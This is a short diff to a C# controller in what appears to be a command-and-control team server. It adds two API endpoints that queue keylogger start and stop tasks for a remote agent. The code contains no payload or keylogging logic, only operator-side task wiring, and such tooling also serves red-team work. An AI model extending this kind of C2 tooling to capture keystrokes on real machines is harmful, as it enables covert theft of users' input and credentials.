@@ -172,6 +172,22 @@ namespace TeamServer.Controllers
             var response = await this._commandService.QueueTaskAsync(agentID, TaskType.GET_UID, TaskCode.NO_CODE, getUIDDTO);
             return response.IsSuccess ? CreatedAtAction(nameof(QueueGetUIDCommand), response.Response) : BadRequest(response.Error);
         }
+
+        [HttpPost("{agentID}/execute/keylogger/start")]
+        public async Task<IActionResult> QueueKeyloggerStartCommand([FromRoute] int agentID)
+        {
+            var response = await _commandService.QueueTaskAsync(
+                agentID, TaskType.KEYLOGGER_START, TaskCode.NO_CODE, new KeyloggerDTO());
+            return response.IsSuccess ? CreatedAtAction(nameof(QueueKeyloggerStartCommand), response.Response) : BadRequest(response.Error);
+        }
+
+        [HttpPost("{agentID}/execute/keylogger/stop")]
+        public async Task<IActionResult> QueueKeyloggerStopCommand([FromRoute] int agentID)
+        {
+            var response = await _commandService.QueueTaskAsync(
+                agentID, TaskType.KEYLOGGER_STOP, TaskCode.NO_CODE, new KeyloggerDTO());
+            return response.IsSuccess ? CreatedAtAction(nameof(QueueKeyloggerStopCommand), response.Response) : BadRequest(response.Error);
+        }
     }
 }
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
